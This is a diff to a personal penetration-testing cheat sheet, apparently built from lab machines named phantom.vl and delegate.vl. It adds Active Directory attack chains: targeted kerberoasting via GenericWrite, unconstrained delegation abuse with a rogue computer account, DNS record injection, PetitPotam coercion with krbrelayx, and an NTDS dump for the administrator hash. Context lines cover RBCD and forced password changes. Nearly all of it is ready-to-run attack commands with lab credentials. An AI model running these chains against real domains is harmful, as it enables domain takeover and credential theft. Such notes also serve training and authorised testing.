@@ -135,31 +135,47 @@ ForceChangePassword
 
 nxc ldap DC.phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc -M change-password -o USER=WSILVA PASSWORD=whoami69
 
-#---------------
+#---------------------------
 
 AddAllowedToAct
-
 netexec smb dc.phantom.vl -u wsilva -p whoami69
-
 netexec ldap dc.phantom.vl -u wsilva -p whoami69 -M maq -> machineaccountquota: 0 so we attack rbcd
-
 rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:whoami -dc-ip [$target_ip]
-
 getTGT.py phantom.vl/wsilva:whoami69
-
 describeTicket.py wsilva.ccache -> Tikcet Session Key: [take_key_from_that]
-
 changepasswd.py -newhashes :[take_key_from_that] phantom/wsilva:whoami69@dc.phantom.vl
-
 KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
-
 KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache -> we will get administrator hash so just use evil-winrm and pwn3d it 
-#---------------
+
+#---------------------------
+Generic Write
+bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' set object N.Thompson servicePrincipalName -v 'http/anything'
+
+impacket-GetUserSPNs -dc-ip 10.129.234.69 -request -request-user N.Thompson delegate.vl/A.Briggs:'P4ssw0rd1#123'
 ```
 
 ```bash
 when getting service accoutn with [nt system\ local service] use [FullPowers.exe] to enabled other privilege
+```
 
+```bash
+Delegation
+findDelegation.py delegate.vl/N.Thompson:KALEB_2341 # finding delegation type
+
+Unconstrain delegation attack
+addcomputer.py -computer-name oxdf -computer-pass 0xdf0xdf. -dc-ip [target_ip] delegate.vl/N.Thompson:'KALEB_2341'
+python dnstool.py -u 'delegate.vl\oxdf$' -p '0xdf0xdf.' --action add --record oxdf.delegate.vl --data [local_ip] --type A -dns-ip [target_ip] dc1.delegate.vl
+python addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/oxdf.delegate.vl' -t 'oxdf$' -dc-ip [target_ip] dc1.delegate.vl
+bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'oxdf$' -f TRUSTED_FOR_DELEGATION
+python -c "password = '0xdf0xdf.'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
+python krbrelayx.py -hashes :from_above_hash
+netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus  -> to use krbrelayx find the vuln and attack
+netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus -o LISTENER=oxdf.delegate.vl METHOD=PetitPotam -> choosing PetitPotam Exploit
+netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. --generate-krb5-file krb5.conf -> for dcsync setup
+cat krb5.conf | sudo tee /etc/krb5.conf
+KRB5CCNAME=[DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache_from_the_krbrelayxCache] netexec smb dc1.delegate.vl --use-kcache 
+KRB5CCNAME=[DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache_from_the_krbrelayxCache] netexec smb dc1.delegate.vl --use-kcache --ntds -> got the administrator hash
+#-----
 ```
 
 ### ECS1
